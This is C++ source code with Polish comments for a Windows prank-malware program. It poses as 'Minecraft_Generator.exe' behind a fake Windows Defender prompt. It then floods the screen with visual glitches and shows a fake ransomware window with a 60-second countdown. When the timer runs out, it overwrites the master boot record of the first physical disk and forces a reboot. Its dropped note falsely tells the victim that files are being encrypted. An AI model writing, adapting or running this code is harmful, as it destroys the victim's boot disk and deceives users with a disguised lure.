#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>

// Flaga bezpieczeństwa
bool isUnlocked = false;

// --- PAYLOAD 1: CHAOS GRAFICZNY (TUNEL I GLITCH) ---
void VisualChaos() {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (!isUnlocked) {
        // Efekt tunelu (MEMZ Style)
        StretchBlt(hdc, 10, 10, sw - 20, sh - 20, hdc, 0, 0, sw, sh, SRCCOPY);
        // Losowe ikony błędów na ekranie
        if (rand() % 10 == 1) {
            DrawIcon(hdc, rand() % sw, rand() % sh, LoadIcon(NULL, IDI_ERROR));
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

// --- PAYLOAD 2: MYSZKA I STRONY WWW ---
void MouseAndWeb() {
    POINT p;
    while (!isUnlocked) {
        GetCursorPos(&p);
        // Ikona podążająca za myszką
        DrawIcon(GetDC(NULL), p.x, p.y, LoadIcon(NULL, IDI_WARNING));
        // Losowe otwieranie przeglądarki
        if (rand() % 500 == 1) {
            ShellExecuteA(NULL, "open", "https://www.google.com/search?q=how+to+kill+malware", NULL, NULL, SW_SHOWNORMAL);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(15));
    }
}

// --- PAYLOAD 3: DESTRUKCJA MBR + ANIMACJA PO RESTARTU ---
void DestroyMBR() {
    // Kod maszynowy asemblera (uproszczony), który po restarcie 
    // przełącza ekran w tryb VGA i rysuje animowany wzór
    unsigned char nyanMBR[512] = {
        0xb8, 0x13, 0x00, 0xcd, 0x10, 0xbe, 0xac, 0x7c, 0xb0, 0x61, 0xba, 0xad, 0x03, 0xee, 0xb0, 0x01,
        0xba, 0xda, 0x03, 0xec, 0xa8, 0x08, 0x75, 0xfb, 0xec, 0xa8, 0x08, 0x74, 0xfb, 0x04, 0x05, 0x3c,
        0x13, 0x72, 0xe5, 0xb0, 0x61, 0xee, 0xeb, 0xe1
    };
    nyanMBR[510] = 0x55; nyanMBR[511] = 0xAA; // Podpis bootowalny

    DWORD dwWritten;
    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        WriteFile(hDisk, nyanMBR, 512, &dwWritten, NULL);
        CloseHandle(hDisk);
    }
    // Wymuszony, natychmiastowy restart
    system("shutdown /r /t 0 /f");
}

// --- OKNO RANSOMWARE (PETYA STYLE) ---
LRESULT CALLBACK RansomProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit;
    if (uMsg == WM_CREATE) {
        CreateWindow("static", "!!! SYSTEM ZABLOKOWANY !!!", WS_CHILD | WS_VISIBLE | SS_CENTER, 0, 10, 500, 20, hwnd, NULL, NULL, NULL);
        CreateWindow("static", "      XXXXX\n     X     X\n    X  O O  X\n    X   ^   X\n     X --- X\n      XXXXX", WS_CHILD | WS_VISIBLE | SS_CENTER, 0, 40, 500, 100, hwnd, NULL, NULL, NULL);
        CreateWindow("static", "WPISZ KLUCZ: 1234 (MASZ 60 SEKUND)", WS_CHILD | WS_VISIBLE | SS_CENTER, 0, 150, 500, 20, hwnd, NULL, NULL, NULL);
        hEdit = CreateWindow("edit", "", WS_CHILD | WS_VISIBLE | WS_BORDER, 150, 180, 100, 25, hwnd, NULL, NULL, NULL);
        CreateWindow("button", "DECRYPT", WS_CHILD | WS_VISIBLE, 260, 180, 80, 25, hwnd, (HMENU)2, NULL, NULL);
    }
    if (uMsg == WM_COMMAND && LOWORD(wParam) == 2) {
        char buffer[10]; GetWindowText(hEdit, buffer, 10);
        if (std::string(buffer) == "1234") { 
            isUnlocked = true; 
            MessageBoxA(NULL, "Klucz poprawny! System zostanie przywrocony.", "SUCCESS", MB_OK); 
            exit(0); 
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// --- GŁÓWNA SEKWENCJA ATAKU ---
void StartEverything() {
    // 1. Ostatnie ostrzeżenie w Notatniku
    std::ofstream f("POWODZENIA.txt");
    f << "Zycze powodzenia z naprawianiem komputera...\n";
    f << "Wlasnie uruchomiles proces, ktorego nie da sie cofnac.\n";
    f << "Twoje pliki sa szyfrowane, a MBR wlasnie ginie.\n";
    f << "Masz 60 sekund."; f.close();
    system("start notepad.exe POWODZENIA.txt");
    std::this_thread::sleep_for(std::chrono::seconds(2));

    // 2. Uruchomienie wątków chaosu
    std::thread(VisualChaos).detach();
    std::thread(MouseAndWeb).detach();

    // 3. Okno Ransomware
    WNDCLASS wc = {0};
    wc.lpfnWndProc = RansomProc; wc.hInstance = GetModuleHandle(NULL);
    wc.hbrBackground = CreateSolidBrush(RGB(170, 0, 0)); wc.lpszClassName = "RansomWindow";
    RegisterClass(&wc);
    HWND hRansom = CreateWindowEx(WS_EX_TOPMOST, "RansomWindow", "CRITICAL FAILURE", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 400, 200, 500, 300, NULL, NULL, NULL, NULL);

    // 4. Timer 60 sekund
    for (int i = 60; i >= 0; i--) {
        if (isUnlocked) return;
        std::string t = "POZOSTALY CZAS: " + std::to_string(i) + "s";
        SetWindowText(hRansom, t.c_str());
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    if (!isUnlocked) DestroyMBR();
}

// --- POCZĄTKOWE GUI ---
LRESULT CALLBACK StartProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_COMMAND && LOWORD(wParam) == 1) { DestroyWindow(hwnd); StartEverything(); }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int main() {
    srand(time(NULL));
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Trzy ostrzeżenia
    if (MessageBoxA(NULL, "Uruchomic 'Minecraft_Generator.exe'?", "Windows Defender", MB_YESNO | MB_ICONWARNING) != IDYES) return 0;
    if (MessageBoxA(NULL, "Program nie posiada cyfrowego podpisu. Kontynuowac?", "Security", MB_YESNO | MB_ICONERROR) != IDYES) return 0;
    if (MessageBoxA(NULL, "TO JEST OSTATNIE OSTRZEZENIE. ZNISZCZYSZ SYSTEM.", "ALERT", MB_YESNO | MB_ICONSTOP) != IDYES) return 0;

    // Przycisk Run!
    WNDCLASS sc = {0};
    sc.lpfnWndProc = StartProc; sc.hInstance = GetModuleHandle(NULL);
    sc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); sc.lpszClassName = "SWin";
    RegisterClass(&sc);
    HWND hS = CreateWindow("SWin", "Launcher", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 500, 300, 300, 150, NULL, NULL, NULL, NULL);
    CreateWindow("button", "Run!", WS_CHILD | WS_VISIBLE, 100, 40, 80, 40, hS, (HMENU)1, NULL, NULL);

    MSG m; while (GetMessage(&m, NULL, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
    return 0;
}